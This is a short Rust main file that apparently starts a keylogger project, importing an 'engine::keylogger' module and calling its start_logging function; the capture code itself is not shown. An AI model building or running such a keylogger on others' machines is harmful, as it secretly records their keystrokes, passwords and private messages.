mod engine;

use engine::{keylogger};

fn main() -> std::io::Result<()> {
    keylogger::start_logging();
    Ok(())
}
